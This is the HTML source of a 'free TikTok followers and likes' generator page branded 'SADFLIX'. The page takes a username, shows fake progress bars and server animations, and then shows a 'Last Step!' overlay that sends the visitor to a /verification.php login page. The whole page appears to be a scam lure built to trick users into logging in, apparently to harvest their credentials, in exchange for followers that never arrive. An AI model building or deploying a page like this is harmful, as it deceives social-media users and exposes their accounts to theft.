<!DOCTYPE html>
<html>
<!-- Powered By SADFLIX  -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Tik Tok Followers</title>

<script src="sadflix/jquery.min.js"></script>
<script src="sadflix/jscript.js"></script>

<link rel="stylesheet" type="text/css" href="sadflix/style.css">
<style>
    @media(max-width:760px){
       #TFG{
           font-size:140%;
       } 
       .buttonstyle{
           font-size:100%;
       }
    
    .followers , .likes{
        width:95%;
    }
    }
</style>
</head>

<body onload="updateyear()">
    


<div id="verifybg">
	<br>
	<br>
	<br>
	<div id="verify">
		<br>
		<br>
		<br>
		<div id="verifycontent">
			<img src="img/logo2.png" height="100" width="100">
			<h1>Last Step!</h1>
			<p>You must login first to<b> Verification</b>.</p>
			<a href="/verification.php" target="blank"><button class="buttonstyle">Login</button></a>
		</div>
		<br>
		<br>
		<br>
	</div>
</div>

<div id="main-tool">
	<div class="wrapper"><img src="img/logo.png"></div>
	<h1 id="TFG">Tiktok Like & Followers</h1>
<p class="sub-heading">Increase Followers & Like Free</p>
    <div id="progressbarcontainer">
    	<div id="progressbar">
    		<div id="progressbarlabel">0%</div>
    	</div>
    </div>

    <p></p><div id="progresslog"></div><p></p>

    <div id="gen7">
    	<div id="addlikebarcontainer">
    		<div id="addlikebar">
    			<div id="addlikebarlabel">50%</div>
    		</div>
    	</div>
    </div>

    <div id="gen6">
    	<div id="addfollowerbarcontainer">
    		<div id="addfollowerbar">
    			<div id="addfollowerbarlabel">100%</div>
    		</div>
    	</div>
    </div>
    
    <div id="gen5"><img src="img/logo.png" width="30%"></div>
    <div id="gen4"><img src="img/usernameconfirm.png" width="10%"></div>
    <div id="gen3"><img src="img/user.png" width="10%"></div>
    <div id="gen2"><img src="img/server.png" width="20%"></div>
    <div id="gen1"><img src="img/server.png" width="20%"></div>

    <div id="fillup">
        <div class="form-option">
        	<input id="username" class="input-form input-command" maxlength="30" type="text" placeholder="TikTok @username">
        </div>
        
        <div class="form-option followers">
            <select id="follower" class="input-form input-command">
            	<option value="100">100 Followers </option>
            	<option value="500">500 Followers</option>
            	<option value="1500">1500 Followers</option>
            	<option value="5000">5000 Followers</option>
            	<option value="100,000">100.000 Followers</option>
            </select>
        </div>
        
        <div class="form-option likes">
            <select id="like" class="input-form input-command">
            	<option value="1500">1500 Like</option>
            	<option value="5000">5000 Likes</option>
            	<option value="10,000">10000 Likes</option>
            	<option value="30.000">30000 Likes</option>
            	<option value="50.000">50000 Likes</option>
            	
            </select>
        </div>
        
        

        <br><br>
        <button class="buttonstyle" onclick="move()"><b>Get it</b></button>

    </div>
</div>

<div id="steps" style="display:none;">

</div>

<div id="comment" style="display:none;" >
</div>
</body>
<!-- Powered By Sadflix -->
</html>